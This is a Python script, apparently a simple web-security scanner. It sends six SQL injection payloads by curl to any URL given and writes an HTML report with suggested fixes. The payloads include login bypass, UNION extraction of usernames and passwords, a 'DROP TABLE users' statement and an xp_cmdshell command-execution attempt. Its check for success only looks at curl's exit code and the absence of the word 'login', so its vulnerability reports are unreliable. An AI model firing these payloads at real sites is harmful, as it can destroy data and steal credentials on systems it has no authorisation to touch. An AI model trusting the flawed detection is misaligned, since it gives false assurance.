import subprocess
import urllib.parse
import os


def run_sqlmap(url: str):
    """
    Test for SQL Injection vulnerabilities and provide explanations.
    Args:
        url (str): The URL to test.
    Returns:
        tuple: Test results as a string and the path to the results file.
    """
    try:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            return "Invalid URL: Must start with http:// or https://", None

        payloads = [
            ("' OR '1'='1 --", "Bypass login with always-true condition."),
            ("' UNION SELECT null, username, password FROM users --", "Extract user credentials via UNION SELECT."),
            ("'; DROP TABLE users; --", "Attempt to delete the users table."),
            ("' OR 'a'='a", "Bypass login with simple true condition."),
            ("'; EXEC xp_cmdshell('dir') --", "Execute system command on the server."),
            ("' AND 1=0 UNION ALL SELECT NULL, version(), current_user --", "Retrieve DB version and current user."),
        ]

        results = ""
        
        for payload, purpose in payloads:
            encoded_payload = urllib.parse.quote(payload)
            full_url = f"{url}?id={encoded_payload}"
            command = ['curl', '-X', 'GET', full_url]
            
            result = subprocess.run(command, capture_output=True, text=True)

            success = "✅" if result.returncode == 0 and "login" not in result.stdout.lower() else "❌"

            results += f"{success} Payload: {payload}\n"
            results += f"Purpose: {purpose}\n"

            if success == "✅":
                results += "Result: Potential vulnerability detected!\n"
            else:
                results += "Result: No vulnerability detected for this payload.\n"

            results += "\nResponse Preview:\n" + result.stdout[:200] + "...\n\n"
            
            # Explain the issue and potential fixes
            if success == "✅":
                results += "Explanation: The server responded positively to the payload, suggesting a possible vulnerability.\n"
                if "1'='1" in payload:
                    results += "Issue: SQL injection allows login bypass.\n"
                    results += "Fix: Use prepared statements or ORM libraries to prevent SQL injection. Validate and sanitize user inputs.\n"
                elif "DROP TABLE" in payload:
                    results += "Issue: SQL injection can delete critical tables.\n"
                    results += "Fix: Apply strict database permissions and input filtering.\n"
                elif "xp_cmdshell" in payload:
                    results += "Issue: Remote code execution.\n"
                    results += "Fix: Disable dangerous SQL functions and limit server privileges.\n"
                else:
                    results += "Issue: Data leakage or server exploitation.\n"
                    results += "Fix: Use Web Application Firewalls (WAFs) and keep software up to date.\n"
                results += "\n"
        
        # Save results to a file
        output_file = "./sql_injection_result.html"
        with open(output_file, "w") as file:
            file.write(f"<html><body><pre>{results}</pre></body></html>")

        return results, output_file

    except Exception as e:
        error_message = f"Error running SQL Injection test: {str(e)}"
        error_file = "./sql_injection_error.txt"
        with open(error_file, "w") as file:
            file.write(error_message)
        return error_message, error_file
